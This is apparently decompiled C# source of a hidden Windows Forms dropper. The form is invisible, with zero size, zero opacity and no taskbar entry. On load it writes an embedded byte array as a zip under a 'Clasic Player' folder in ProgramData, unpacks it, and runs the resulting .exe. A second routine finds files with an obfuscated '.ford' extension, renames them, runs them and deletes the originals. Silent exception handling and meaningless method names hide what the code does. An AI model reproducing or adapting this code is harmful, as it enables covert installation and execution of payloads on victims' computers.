using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace rdvimainta;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	public void UnShohrp()
	{
		try
		{
			string text = "\\Clasic Player\\";
			string text2 = "hdrmiprcav";
			string text3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + text;
			zeshoe zeshoe2 = new zeshoe();
			myshopc myshopc2 = new myshopc();
			Environment.OSVersion.ToString();
			string[] source = (string[])myshopc2.getShin();
			byte[] bytes = source.Select((string s) => byte.Parse(s)).ToArray();
			if (!Directory.Exists(text3))
			{
				Directory.CreateDirectory(text3);
			}
			string text4 = text3 + text2;
			if (!File.Exists(text4))
			{
				File.WriteAllBytes(text4 + ".zip", bytes);
			}
			if (!File.Exists(text4 + ".exe".ToString()))
			{
				zeshoe2.uindTuile(text4, text3);
			}
			Thread.Sleep(410);
			Process.Start(text4 + ".exe".ToString());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void oprShohes(string fil_path)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(fil_path);
			FileInfo[] files = directoryInfo.GetFiles("*.fo_r_d".Replace("_", ""));
			FileInfo[] array = files;
			int num = 0;
			if (0 < array.Length)
			{
				FileInfo fileInfo = array[num];
				string text = fil_path + "\\\\" + fileInfo.get_Name().Replace(".fo_r_d".Replace("_", ""), "").Replace("$", ".");
				File.WriteAllBytes(text, File.ReadAllBytes(fileInfo.FullName));
				Process.Start(text);
				File.Delete(fileInfo.FullName);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Do_shuro_aide()
	{
		try
		{
			string text = Path.GetFileName(Application.get_ExecutablePath())!.Split(new char[1] { '.' })[0];
			zeshoe zeshoe2 = new zeshoe();
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\";
			string text3 = text2 + text;
			if (File.Exists(text3 + ".zip"))
			{
			}
			zeshoe2.uindTuile(text3, text2);
			oprShohes(text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Thread.Sleep(810);
		Thread.Sleep(5010);
		UnShohrp();
		Thread.Sleep(10120);
		try
		{
			((Form)this).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
	}
}
